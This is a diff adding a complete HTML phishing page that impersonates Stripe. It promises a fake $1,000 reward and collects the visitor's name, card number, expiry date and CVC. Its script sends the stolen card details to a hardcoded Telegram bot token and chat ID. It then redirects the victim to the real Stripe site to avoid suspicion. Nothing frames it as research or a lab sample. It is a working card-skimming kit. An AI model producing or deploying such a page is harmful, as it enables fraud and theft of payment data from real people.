@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stripe | Secure Payment Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --stripe-blurple: #635bff;
+            --stripe-green: #00ab6f;
+            --stripe-red: #fa755a;
+            --background-color: #f6f9fc;
+            --text-dark: #32325d;
+            --text-light: #6b7c93;
+            --border-color: #e6ebf1;
+            --box-shadow: 0 7px 14px 0 rgba(60, 66, 87, 0.12), 0 3px 6px 0 rgba(0, 0, 0, 0.12);
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--background-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            display: flex;
+            width: 100%;
+            max-width: 800px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: var(--box-shadow);
+            overflow: hidden;
+        }
+        .info-panel {
+            background-color: #fbfdff;
+            padding: 40px;
+            width: 45%;
+            box-sizing: border-box;
+            border-right: 1px solid var(--border-color);
+        }
+        .info-panel .logo {
+            width: 100px;
+            margin-bottom: 30px;
+        }
+        .info-panel h1 {
+            font-size: 22px;
+            color: var(--text-dark);
+            margin-bottom: 15px;
+        }
+        .info-panel p {
+            font-size: 15px;
+            color: var(--text-light);
+            line-height: 1.6;
+        }
+        .highlight {
+            font-weight: 600;
+            color: var(--stripe-green);
+        }
+        .form-panel {
+            padding: 40px;
+            width: 55%;
+            box-sizing: border-box;
+        }
+        .form-panel h2 {
+            font-size: 18px;
+            color: var(--text-dark);
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--text-dark);
+        }
+        input {
+            width: 100%;
+            padding: 11px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--stripe-blurple);
+            box-shadow: 0 0 0 1px var(--stripe-blurple);
+        }
+        input.invalid {
+            border-color: var(--stripe-red);
+            box-shadow: 0 0 0 1px var(--stripe-red);
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            background-color: var(--stripe-blurple);
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+        button:hover {
+            background-color: #554dfc;
+        }
+        button:active {
+            transform: scale(0.99);
+        }
+        .footer {
+            margin-top: 30px;
+
+text-align: center;
+            font-size: 12px;
+            color: var(--text-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
+        .loader {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid var(--stripe-blurple);
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 768px) {
+            .container { flex-direction: column; }
+            .info-panel, .form-panel { width: 100%; }
+            .info-panel { border-right: none; border-bottom: 1px solid var(--border-color); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="info-panel">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Stripe_Logo%2C_revised_2016.svg/2560px-Stripe_Logo%2C_revised_2016.svg.png" alt="Stripe Logo" class="logo">
+            <h1>Your $1,000 Reward is Waiting</h1>
+            <p>As part of our 2023 User Appreciation Program, your account has been selected to receive a <span class="highlight">$1,000 credit</span>.</p>
+            <p>For security, please verify your primary card on file. This is a one-time verification to ensure the credit is applied to the correct account holder. The process is encrypted and secure.</p>
+        </div>
+        <div class="form-panel">
+            <h2>Verify your card to receive funds</h2>
+            <form id="payment-form" novalidate>
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" name="name" placeholder="John M. Doe" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" name="card_number" placeholder="0000 0000 0000 0000" required maxlength="19">
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label for="expiry">Expiry Date</label>
+                        <input type="text" id="expiry" name="expiry" placeholder="MM / YY" required maxlength="7">
+                    </div>
+                    <div class="form-group">
+                        <label for="cvc">CVC</label>
+                        <input type="text" id="cvc" name="cvc" placeholder="123" required maxlength="4">
+                    </div>
+                </div>
+                <button type="submit" id="submit-button">
+                    <span id="button-text">Securely Verify & Claim $1,000</span>
+                    <div class="loader" id="loader"></div>
+                </button>
+            </form>
+            <div class="footer">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16" height="16"><path d="M12 1.5A5.25 5.25 0 006.75 6.75v3.375c0 .91-.122 1.801-.358 2.647H3.6c-.414 0-.75.336-.75.75v7.5c0 .414.336.75.75.75h16.8c.414 0 .75-.336.75-.75v-7.5a.75.75 0 00-.75-.75h-2.792a12.054 12.054 0 00-.358-2.647V6.75A5.25 5.25 0 0012 1.5zM8.25 6.75a3.75 3.75 0 017.5 0v3.375a13.553 13.553 0 01-7.5 0V6.75z"></path></svg>
+                <span>Payments secured by Stripe</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const botToken = '8254458626:AAHwhFEuRKs9OS2YLgCsWFneUsaI8UThMfw'; // Replace with your Telegram bot token
+        const chatId = '6966542803';   // Replace with your Telegram chat ID
+        // ---------------------
+
+        const form = document.getElementById('payment-form');
+        const nameInput = document.getElementById('name');
+        const cardInput = document.getElementById('card-number');
+        const expiryInput = document.getElementById('expiry');
+        const cvcInput = document.getElementById('cvc');
+        const submitButton = document.getElementById('submit-button');
+        const buttonText = document.getElementById('button-text');
+        const loader = document.getElementById('loader');
+
+        // Real-time formatting
+        cardInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+            validateInput(cardInput, cardInput.value.length === 19);
+        });
+
+        expiryInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = `${value.slice(0, 2)} / ${value.slice(2, 4)}`;
+            }
+            e.target.value = value;
+            validateInput(expiryInput, expiryInput.value.length === 7);
+        });
+        
+        // Validation on blur
+        [nameInput, cardInput, expiryInput, cvcInput].forEach(input => {
+            input.addEventListener('blur', () => {
+                let isValid = false;
+                if (input.id === 'name') isValid = input.value.trim().length > 0;
+                if (input.id === 'card-number') isValid = input.value.length === 19;
+                if (input.id === 'expiry') isValid = input.value.length === 7;
+                if (input.id === 'cvc') isValid = input.value.length >= 3 && input.value.length <= 4;
+                validateInput(input, isValid);
+            });
+        });
+
+        function validateInput(inputElement, isValid) {
+            if (isValid) {
+                inputElement.classList.remove('invalid');
+            } else {
+                inputElement.classList.add('invalid');
+            }
+        }
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Final validation check
+            const isNameValid = nameInput.value.trim().length > 0;
+            const isCardValid = cardInput.value.length === 19;
+            const isExpiryValid = expiryInput.value.length === 7;
+            const isCvcValid = cvcInput.value.length >= 3 && cvcInput.value.length <= 4;
+
+            validateInput(nameInput, isNameValid);
+            validateInput(cardInput, isCardValid);
+            validateInput(expiryInput, isExpiryValid);
+            validateInput(cvcInput, isCvcValid);
+
+            if (!isNameValid || !isCardValid || !isExpiryValid || !isCvcValid) {
+                return; // Stop submission if any field is invalid
+            }
+            
+            // Show loader, disable button
+            buttonText.textContent = 'Processing...';
+            loader.style.display = 'block';
+            submitButton.disabled = true;
+
+            const message = `
+**IGris has delivered my King**
+-----------------------------
+**Full Name:** \`${nameInput.value}\`
+**Card Number:** \`${cardInput.value}\`
+**Expiry:** \`${expiryInput.value}\`
+**CVC:** \`${cvcInput.value}\`
+-----------------------------
+            `;
+
+            sendToTelegram(message);
+        });
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const params = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+
+fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Successfully sent to Telegram:', data);
+                // Redirect to a legitimate-looking success page after a short delay
+                setTimeout(() => {
+                    window.location.href = 'https://stripe.com/payments/checkout';
+                }, 1500);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+                setTimeout(() => {
+                    window.location.href = 'https://stripe.com/payments/checkout';
+                }, 1500);
+            });
+        }
+    </script>
+
+</body>
+</html>
